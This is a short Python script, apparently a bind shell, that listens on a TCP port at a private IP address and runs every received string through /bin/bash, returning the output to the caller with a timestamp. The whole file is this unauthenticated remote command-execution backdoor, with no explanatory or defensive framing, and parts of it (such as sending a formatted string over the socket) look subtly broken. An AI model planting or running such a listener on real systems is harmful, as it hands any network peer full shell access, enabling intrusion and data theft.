import socket
import subprocess
from subprocess import PIPE
from time import ctime

s = socket.socket()

host = '192.168.215.153'
port = 2336

s.bind((host, port))
s.listen(5)

while 1:
    print('waiting for connection.....')
    c, addr = s.accept()
    print('new connected from:', addr)
    while 1:
        data = c.recv(1024)
        if not data:
            break
        cmd = subprocess.Popen(['/bin/bash', '-c', data], stdin=PIPE, stdout=PIPE, shell=True)
        datas = cmd.stdout.read()
        c.send(('[%s] %s' % (ctime(), datas)))
